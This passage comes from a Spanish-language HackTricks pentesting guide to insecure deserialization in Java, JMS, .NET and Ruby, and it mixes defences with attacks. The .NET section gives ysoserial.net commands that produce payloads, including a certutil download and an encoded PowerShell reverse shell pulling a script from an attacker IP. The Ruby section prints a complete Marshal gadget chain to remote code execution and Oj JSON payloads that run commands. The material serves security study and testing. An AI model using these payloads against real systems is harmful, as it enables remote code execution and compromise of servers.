En escenarios donde ciertos **objetos deben implementar la interfaz `Serializable`** debido a la jerarqu칤a de clases, existe el riesgo de deserializaci칩n no intencionada. Para prevenir esto, aseg칰rese de que estos objetos no sean deserializables definiendo un m칠todo `readObject()` `final` que lance consistentemente una excepci칩n, como se muestra a continuaci칩n:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Mejorando la Seguridad de la Deserializaci칩n en Java**

**Personalizar `java.io.ObjectInputStream`** es un enfoque pr치ctico para asegurar los procesos de deserializaci칩n. Este m칠todo es adecuado cuando:

* El c칩digo de deserializaci칩n est치 bajo tu control.
* Las clases esperadas para la deserializaci칩n son conocidas.

Sobrescribe el **`resolveClass()`** m칠todo para limitar la deserializaci칩n solo a las clases permitidas. Esto previene la deserializaci칩n de cualquier clase excepto aquellas expl칤citamente permitidas, como en el siguiente ejemplo que restringe la deserializaci칩n solo a la clase `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Usando un Agente de Java para Mejora de Seguridad** ofrece una soluci칩n alternativa cuando la modificaci칩n del c칩digo no es posible. Este m칠todo se aplica principalmente para **bloquear clases da침inas**, utilizando un par치metro de JVM:
```
-javaagent:name-of-agent.jar
```
Proporciona una forma de asegurar la deserializaci칩n de manera din치mica, ideal para entornos donde los cambios de c칩digo inmediatos son impr치cticos.

Consulta un ejemplo en [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementando Filtros de Serializaci칩n**: Java 9 introdujo filtros de serializaci칩n a trav칠s de la interfaz **`ObjectInputFilter`**, proporcionando un mecanismo poderoso para especificar criterios que los objetos serializados deben cumplir antes de ser deserializados. Estos filtros se pueden aplicar globalmente o por flujo, ofreciendo un control granular sobre el proceso de deserializaci칩n.

Para utilizar filtros de serializaci칩n, puedes establecer un filtro global que se aplique a todas las operaciones de deserializaci칩n o configurarlo din치micamente para flujos espec칤ficos. Por ejemplo:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Aprovechando Bibliotecas Externas para una Mayor Seguridad**: Bibliotecas como **NotSoSerial**, **jdeserialize** y **Kryo** ofrecen caracter칤sticas avanzadas para controlar y monitorear la deserializaci칩n de Java. Estas bibliotecas pueden proporcionar capas adicionales de seguridad, como la creaci칩n de listas blancas o negras de clases, el an치lisis de objetos serializados antes de la deserializaci칩n e implementar estrategias de serializaci칩n personalizadas.

* **NotSoSerial** intercepta los procesos de deserializaci칩n para prevenir la ejecuci칩n de c칩digo no confiable.
* **jdeserialize** permite el an치lisis de objetos Java serializados sin deserializarlos, ayudando a identificar contenido potencialmente malicioso.
* **Kryo** es un marco de serializaci칩n alternativo que enfatiza la velocidad y eficiencia, ofreciendo estrategias de serializaci칩n configurables que pueden mejorar la seguridad.

### Referencias

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Charla sobre deserializaci칩n y ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Charla sobre gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) y diapositivas: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Documento de Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Deserializaciones CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Inyecci칩n JNDI & log4Shell

Encuentra qu칠 es **Inyecci칩n JNDI, c칩mo abusar de ella a trav칠s de RMI, CORBA y LDAP y c칩mo explotar log4shell** (y un ejemplo de esta vulnerabilidad) en la siguiente p치gina:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Servicio de Mensajes de Java

> La API de **Servicio de Mensajes de Java** (**JMS**) es una API de middleware orientada a mensajes de Java para enviar mensajes entre dos o m치s clientes. Es una implementaci칩n para manejar el problema del productor-consumidor. JMS es parte de la Plataforma Java, Edici칩n Empresarial (Java EE), y fue definida por una especificaci칩n desarrollada en Sun Microsystems, pero que desde entonces ha sido guiada por el Proceso de Comunidad Java. Es un est치ndar de mensajer칤a que permite a los componentes de aplicaci칩n basados en Java EE crear, enviar, recibir y leer mensajes. Permite que la comunicaci칩n entre diferentes componentes de una aplicaci칩n distribuida sea d칠bilmente acoplada, confiable y as칤ncrona. (De [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Productos

Hay varios productos que utilizan este middleware para enviar mensajes:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Explotaci칩n

Entonces, b치sicamente hay un **mont칩n de servicios que utilizan JMS de manera peligrosa**. Por lo tanto, si tienes **suficientes privilegios** para enviar mensajes a estos servicios (generalmente necesitar치s credenciales v치lidas), podr칤as ser capaz de enviar **objetos maliciosos serializados que ser치n deserializados por el consumidor/suscriptor**.\
Esto significa que en esta explotaci칩n todos los **clientes que vayan a usar ese mensaje se infectar치n**.

Debes recordar que incluso si un servicio es vulnerable (porque est치 deserializando de manera insegura la entrada del usuario), a칰n necesitas encontrar gadgets v치lidos para explotar la vulnerabilidad.

La herramienta [JMET](https://github.com/matthiaskaiser/jmet) fue creada para **conectar y atacar estos servicios enviando varios objetos maliciosos serializados utilizando gadgets conocidos**. Estos exploits funcionar치n si el servicio sigue siendo vulnerable y si alguno de los gadgets utilizados est치 dentro de la aplicaci칩n vulnerable.

### Referencias

* Charla de JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Diapositivas: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

En el contexto de .Net, los exploits de deserializaci칩n operan de manera similar a los encontrados en Java, donde se explotan gadgets para ejecutar c칩digo espec칤fico durante la deserializaci칩n de un objeto.

### Huella

#### WhiteBox

El c칩digo fuente debe ser inspeccionado en busca de ocurrencias de:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

El enfoque debe estar en los serializadores que permiten que el tipo sea determinado por una variable bajo control del usuario.

#### BlackBox

La b칰squeda debe dirigirse a la cadena codificada en Base64 **AAEAAAD/////** o cualquier patr칩n similar que pueda ser deserializado en el lado del servidor, otorgando control sobre el tipo a deserializar. Esto podr칤a incluir, pero no se limita a, estructuras **JSON** o **XML** que presenten `TypeObject` o `$type`.

### ysoserial.net

En este caso, puedes usar la herramienta [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) para **crear los exploits de deserializaci칩n**. Una vez descargado el repositorio git, deber칤as **compilar la herramienta** usando Visual Studio, por ejemplo.

Si deseas aprender sobre **c칩mo ysoserial.net crea su exploit**, puedes [**consultar esta p치gina donde se explica el gadget ObjectDataProvider + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Las principales opciones de **ysoserial.net** son: **`--gadget`**, **`--formatter`**, **`--output`** y **`--plugin`.**

* **`--gadget`** se utiliza para indicar el gadget a abusar (indicar la clase/funci칩n que ser치 abusada durante la deserializaci칩n para ejecutar comandos).
* **`--formatter`**, se utiliza para indicar el m칠todo para serializar el exploit (necesitas saber qu칠 biblioteca est치 utilizando el backend para deserializar la carga y usar la misma para serializarla).
* **`--output`** se utiliza para indicar si deseas el exploit en **crudo** o **codificado en base64**. _Ten en cuenta que **ysoserial.net** **codificar치** la carga utilizando **UTF-16LE** (codificaci칩n utilizada por defecto en Windows), por lo que si obtienes el crudo y simplemente lo codificas desde una consola de linux, podr칤as tener algunos **problemas de compatibilidad de codificaci칩n** que impedir치n que el exploit funcione correctamente (en la caja JSON de HTB, la carga funcion칩 tanto en UTF-16LE como en ASCII, pero esto no significa que siempre funcionar치)._
* **`--plugin`** ysoserial.net admite plugins para crear **exploits para marcos espec칤ficos** como ViewState.

#### M치s par치metros de ysoserial.net

* `--minify` proporcionar치 una **carga 칰til m치s peque침a** (si es posible)
* `--raf -f Json.Net -c "anything"` Esto indicar치 todos los gadgets que se pueden usar con un formateador proporcionado (`Json.Net` en este caso)
* `--sf xml` puedes **indicar un gadget** (`-g`) y ysoserial.net buscar치 formateadores que contengan "xml" (sin distinci칩n de may칰sculas y min칰sculas)

**Ejemplos de ysoserial** para crear exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** tambi칠n tiene un **par치metro muy interesante** que ayuda a entender mejor c칩mo funciona cada exploit: `--test`\
Si indicas este par치metro, **ysoserial.net** **intentar치** el **exploit localmente,** as칤 que puedes probar si tu payload funcionar치 correctamente.\
Este par치metro es 칰til porque si revisas el c칩digo encontrar치s fragmentos de c칩digo como el siguiente (de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Esto significa que para probar la explotaci칩n, el c칩digo llamar치 a [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
En el **c칩digo anterior es vulnerable al exploit creado**. As칤 que si encuentras algo similar en una aplicaci칩n .Net, significa que probablemente esa aplicaci칩n tambi칠n sea vulnerable.\
Por lo tanto, el **`--test`** permite entender **qu칠 fragmentos de c칩digo son vulnerables** al exploit de deserializaci칩n que **ysoserial.net** puede crear.

### ViewState

Echa un vistazo a [este POST sobre **c칩mo intentar explotar el par치metro \_\_ViewState de .Net**](exploiting-\_\_viewstate-parameter.md) para **ejecutar c칩digo arbitrario.** Si **ya conoces los secretos** utilizados por la m치quina v칤ctima, [**lee este post para saber c칩mo ejecutar c칩digo**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Prevenci칩n

Para mitigar los riesgos asociados con la deserializaci칩n en .Net:

* **Evita permitir que los flujos de datos definan sus tipos de objeto.** Utiliza `DataContractSerializer` o `XmlSerializer` cuando sea posible.
* **Para `JSON.Net`, establece `TypeNameHandling` en `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Evita usar `JavaScriptSerializer` con un `JavaScriptTypeResolver`.**
* **Limita los tipos que pueden ser deserializados**, entendiendo los riesgos inherentes con los tipos de .Net, como `System.IO.FileInfo`, que puede modificar las propiedades de los archivos del servidor, lo que podr칤a llevar a ataques de denegaci칩n de servicio.
* **Ten cuidado con los tipos que tienen propiedades arriesgadas**, como `System.ComponentModel.DataAnnotations.ValidationException` con su propiedad `Value`, que puede ser explotada.
* **Controla de manera segura la instanciaci칩n de tipos** para evitar que los atacantes influyan en el proceso de deserializaci칩n, lo que har칤a que incluso `DataContractSerializer` o `XmlSerializer` sean vulnerables.
* **Implementa controles de lista blanca** utilizando un `SerializationBinder` personalizado para `BinaryFormatter` y `JSON.Net`.
* **Mantente informado sobre gadgets de deserializaci칩n insegura conocidos** dentro de .Net y aseg칰rate de que los deserializadores no instancien tales tipos.
* **A칤sla el c칩digo potencialmente arriesgado** del c칩digo con acceso a internet para evitar exponer gadgets conocidos, como `System.Windows.Data.ObjectDataProvider` en aplicaciones WPF, a fuentes de datos no confiables.

### **Referencias**

* Documento sobre deserializaci칩n JSON en Java y .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** charla: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) y diapositivas: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

En Ruby, la serializaci칩n se facilita mediante dos m칠todos dentro de la biblioteca **marshal**. El primer m칠todo, conocido como **dump**, se utiliza para transformar un objeto en un flujo de bytes. Este proceso se conoce como serializaci칩n. Por el contrario, el segundo m칠todo, **load**, se emplea para revertir un flujo de bytes de nuevo a un objeto, un proceso conocido como deserializaci칩n.

Para asegurar objetos serializados, **Ruby emplea HMAC (C칩digo de Autenticaci칩n de Mensajes Basado en Hash)**, asegurando la integridad y autenticidad de los datos. La clave utilizada para este prop칩sito se almacena en una de varias ubicaciones posibles:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Cadena de gadgets de deserializaci칩n gen칠rica de Ruby 2.X a RCE (m치s informaci칩n en** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Otro cadena RCE para explotar Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### M칠todo Ruby .send()

Como se explica en [**este informe de vulnerabilidad**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), si alguna entrada no sanitizada de un usuario llega al m칠todo `.send()` de un objeto ruby, este m칠todo permite **invocar cualquier otro m칠todo** del objeto con cualquier par치metro.

Por ejemplo, llamar a eval y luego c칩digo ruby como segundo par치metro permitir치 ejecutar c칩digo arbitrario:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Adem치s, si solo un par치metro de **`.send()`** es controlado por un atacante, como se mencion칩 en el escrito anterior, es posible llamar a cualquier m칠todo del objeto que **no necesite argumentos** o cuyos argumentos tengan **valores predeterminados**.\
Para esto, es posible enumerar todos los m칠todos del objeto para **encontrar algunos m칠todos interesantes que cumplan con esos requisitos**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

### Otras bibliotecas

Esta t칠cnica fue tomada[ **de esta publicaci칩n en el blog**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared).

Hay otras bibliotecas de Ruby que se pueden usar para serializar objetos y, por lo tanto, que podr칤an ser abusadas para obtener RCE durante una deserializaci칩n insegura. La siguiente tabla muestra algunas de estas bibliotecas y el m칠todo que llaman de la biblioteca cargada cada vez que se deserializan (funci칩n a abusar para obtener RCE b치sicamente):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Biblioteca</strong></td><td><strong>Datos de entrada</strong></td><td><strong>M칠todo de inicio dentro de la clase</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binario</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (la clase debe ser puesta en hash(mapa) como clave)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (la clase debe ser puesta en hash(mapa) como clave)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (la clase debe ser puesta en hash(mapa) como clave)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([ver notas sobre json_create al final](#table-vulnerable-sinks))</td></tr></tbody></table>

Ejemplo b치sico:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
En el caso de intentar abusar de Oj, fue posible encontrar una clase gadget que dentro de su funci칩n `hash` llamar치 a `to_s`, que llamar치 a spec, que llamar치 a fetch\_path, lo que fue posible hacer que obtuviera una URL aleatoria, dando un gran detector de este tipo de vulnerabilidades de deserializaci칩n no sanitizadas.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport","path": "/", "user": "anyuser", "password": "anypw"
}
```
Adem치s, se encontr칩 que con la t칠cnica anterior tambi칠n se crea una carpeta en el sistema, que es un requisito para abusar de otro gadget con el fin de transformar esto en un RCE completo con algo como:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Consulta m치s detalles en la [**publicaci칩n original**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared).

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Consulta los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
